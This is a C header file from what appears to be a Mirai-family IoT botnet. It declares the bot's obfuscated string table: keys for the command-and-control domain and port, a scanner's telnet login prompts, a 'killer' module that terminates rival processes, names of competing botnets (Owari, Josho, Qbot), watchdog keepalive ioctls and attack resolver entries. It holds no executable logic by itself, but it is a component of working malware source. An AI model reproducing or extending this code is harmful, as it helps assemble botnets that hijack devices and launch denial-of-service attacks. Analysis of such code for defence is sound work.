#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* cnc */
#define TABLE_CNC_DOMAIN 1
#define TABLE_CNC_PORT 2

/* report */
#define TABLE_SCAN_CB_DOMAIN 3
#define TABLE_SCAN_CB_PORT 4

/* exec message */
#define TABLE_EXEC_SUCCESS 5

/* killer data */
#define TABLE_KILLER_PROC 6
#define TABLE_KILLER_EXE 7
#define TABLE_KILLER_FD 8
#define TABLE_KILLER_MAPS 9
#define TABLE_KILLER_TCP 10

/* scanner data */
#define TABLE_SCAN_SHELL 11
#define TABLE_SCAN_ENABLE 12
#define TABLE_SCAN_SYSTEM 13
#define TABLE_SCAN_SH 14
#define TABLE_SCAN_LSHELL 15
#define TABLE_SCAN_QUERY 16
#define TABLE_SCAN_RESP 17
#define TABLE_SCAN_NCORRECT 18
#define TABLE_SCAN_ASSWORD 19
#define TABLE_SCAN_OGIN 20
#define TABLE_SCAN_ENTER 21
#define TABLE_SCAN_PS 22
#define TABLE_SCAN_KILL_9 23

/* exec data */
#define TABLE_EXEC_MIRAI 24
#define TABLE_EXEC_OWARI 25
#define TABLE_EXEC_JOSHO 26
#define TABLE_EXEC_ALLQBOT 27
#define TABLE_EXEC_OGOWARI 28
#define TABLE_EXEC_MIRAIDLR 29
#define TABLE_EXEC_MIRAIARM 30
#define TABLE_EXEC_MIRAIMIPS 31
#define TABLE_EXEC_MIRAIMPSL 32
#define TABLE_EXEC_X86_64 33
#define TABLE_EXEC_X86 34

#define TABLE_IOCTL_KEEPALIVE1 35
#define TABLE_IOCTL_KEEPALIVE2 36
#define TABLE_IOCTL_KEEPALIVE3 37
#define TABLE_IOCTL_KEEPALIVE4 38
#define TABLE_IOCTL_KEEPALIVE5 39
#define TABLE_IOCTL_KEEPALIVE6 40
#define TABLE_IOCTL_KEEPALIVE7 41

/* attack data */
#define TABLE_ATK_VSE 42
#define TABLE_ATK_RESOLVER 43
#define TABLE_ATK_NSERV 44

#define TABLE_MAX_KEYS 45 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
